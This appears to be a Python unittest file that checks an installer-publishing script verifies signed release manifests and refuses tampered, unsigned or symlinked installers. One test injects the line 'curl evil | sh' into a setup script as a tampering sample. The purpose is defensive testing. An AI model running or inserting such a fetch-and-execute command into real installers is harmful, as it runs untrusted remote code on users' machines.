#!/usr/bin/env python3
"""Tests of pages_installers.py with throwaway keys (the signer of
test_release_manifest.py), never a release key."""

from __future__ import annotations

import hashlib
import importlib.util
import io
import sys
import tempfile
import unittest
from contextlib import redirect_stderr
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.dont_write_bytecode = True


def load(name: str):
    spec = importlib.util.spec_from_file_location(name, HERE / f"{name}.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


pi = load("pages_installers")
signer = load("test_release_manifest")
rm = pi.rm

SETUP_SH = b"#!/usr/bin/env bash\necho test installer\n"
SETUP_PS1 = b"# test installer\r\nWrite-Output 'x'\r\n"


def entry(data: bytes) -> dict:
    return {"sha256": hashlib.sha256(data).hexdigest(), "size": len(data)}


class PagesInstallersTests(unittest.TestCase):
    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory()
        root = Path(self.temporary.name)
        self.release = root / "release"
        self.output = root / "site"
        self.release.mkdir()
        self.output.mkdir()
        self.key = signer.TestKey()
        self.other = signer.TestKey()
        self.keys = [self.key.public_text(), self.other.public_text()]

    def tearDown(self):
        self.temporary.cleanup()

    def write_release(self, assets: dict | None = None, version: str = "1.2.3", distribution: str = "aitp",
                      key=None, files: dict | None = None) -> None:
        if assets is None:
            assets = {
                "aitp-linux-x86_64": {"sha256": "0" * 64, "size": rm.ASSET_MIN},
                "setup.sh": entry(SETUP_SH),
                "setup.ps1": entry(SETUP_PS1),
            }
        manifest = rm.render_manifest(distribution, version, assets)
        (self.release / "aitp-manifest.json").write_bytes(manifest)
        (self.release / "aitp-manifest.json.minisig").write_bytes((key or self.key).sign(manifest))
        for name, data in (files if files is not None else {"setup.sh": SETUP_SH, "setup.ps1": SETUP_PS1}).items():
            (self.release / name).write_bytes(data)

    def publish(self, tag: str | None = "v1.2.3", keys: list[str] | None = None):
        return pi.publish_installers(self.release, self.output, tag, self.keys if keys is None else keys, "aitp")

    def assert_refused(self, message: str, **kwargs):
        with self.assertRaises(rm.CheckError) as raised:
            self.publish(**kwargs)
        self.assertIn(message, str(raised.exception))
        self.assertEqual(sorted(path.name for path in self.output.iterdir()), [])

    def test_copies_the_checked_installers(self):
        self.write_release()
        key_id, version = self.publish()
        self.assertEqual(key_id, rm.key_id_text(self.key.key_id))
        self.assertEqual(version, "1.2.3")
        self.assertEqual((self.output / "setup.sh").read_bytes(), SETUP_SH)
        self.assertEqual((self.output / "setup.ps1").read_bytes(), SETUP_PS1)
        self.assertEqual(sorted(path.name for path in self.output.iterdir()), ["setup.ps1", "setup.sh"])
        # The second trusted key (the recovery key) is accepted too.
        self.write_release(key=self.other)
        self.assertEqual(self.publish()[0], rm.key_id_text(self.other.key_id))

    def test_replaces_installers_already_in_the_site(self):
        (self.output / "setup.sh").write_bytes(b"old")
        self.write_release()
        self.publish()
        self.assertEqual((self.output / "setup.sh").read_bytes(), SETUP_SH)

    def test_an_untrusted_signature_is_refused(self):
        self.write_release(key=signer.TestKey())
        self.assert_refused("which is not trusted")

    def test_a_changed_manifest_is_refused(self):
        self.write_release()
        manifest = self.release / "aitp-manifest.json"
        manifest.write_bytes(manifest.read_bytes().replace(b"1.2.3", b"1.2.4"))
        self.assert_refused("does not verify", tag=None)

    def test_a_missing_or_broken_signature_is_refused(self):
        self.write_release()
        (self.release / "aitp-manifest.json.minisig").write_bytes(b"not a signature\n")
        self.assert_refused("lines")
        (self.release / "aitp-manifest.json.minisig").unlink()
        self.assert_refused("signature is missing")

    def test_a_changed_installer_is_refused(self):
        for name, data in (("setup.sh", SETUP_SH + b"curl evil | sh\n"), ("setup.ps1", SETUP_PS1[:-1])):
            with self.subTest(name=name):
                files = {"setup.sh": SETUP_SH, "setup.ps1": SETUP_PS1}
                files[name] = data
                self.write_release(files=files)
                self.assert_refused(f"{name} does not match the manifest")

    def test_a_same_size_changed_installer_is_refused(self):
        self.write_release(files={"setup.sh": SETUP_SH.replace(b"test", b"evil"), "setup.ps1": SETUP_PS1})
        self.assert_refused("setup.sh does not match the manifest")

    def test_a_missing_installer_is_refused(self):
        self.write_release(files={"setup.sh": SETUP_SH})
        self.assert_refused("installer is missing")

    def test_a_manifest_without_the_installers_is_refused(self):
        # A release from before the installers were release assets.
        self.write_release(assets={"aitp-linux-x86_64": {"sha256": "0" * 64, "size": rm.ASSET_MIN}})
        self.assert_refused("does not list setup.sh")

    def test_the_tag_must_name_the_manifest_version(self):
        self.write_release()
        self.assert_refused("the release tag is v1.2.4", tag="v1.2.4")

    def test_another_distribution_is_refused(self):
        self.write_release(distribution="other")
        self.assert_refused("distribution 'other'")

    def test_placeholder_keys_are_refused(self):
        self.write_release()
        self.assert_refused("placeholders", keys=list(rm.PLACEHOLDER_KEYS))

    def test_a_symlinked_installer_is_refused(self):
        target = Path(self.temporary.name) / "elsewhere.sh"
        target.write_bytes(SETUP_SH)
        self.write_release(files={"setup.ps1": SETUP_PS1})
        (self.release / "setup.sh").symlink_to(target)
        self.assert_refused("not a regular file")

    def test_the_command_line_fails_closed(self):
        self.write_release(key=signer.TestKey())
        stderr = io.StringIO()
        with redirect_stderr(stderr):
            status = pi.main(["--release", str(self.release), "--output", str(self.output)])
        self.assertEqual(status, 1)
        self.assertIn("pages_installers.py:", stderr.getvalue())
        self.assertEqual(list(self.output.iterdir()), [])

    def test_the_built_in_keys_are_the_brand_keys(self):
        # Without keys given, the script reads the keys the program is built
        # with (as the release workflow's verify does): a throwaway key is
        # not among them.
        self.write_release()
        with self.assertRaises(rm.CheckError) as raised:
            pi.publish_installers(self.release, self.output, "v1.2.3")
        self.assertIn("which is not trusted", str(raised.exception))
        for key in rm.brand_keys():
            self.assertIn(rm.key_id_text(rm.parse_public_key(key)[0]), str(raised.exception))


if __name__ == "__main__":
    unittest.main()
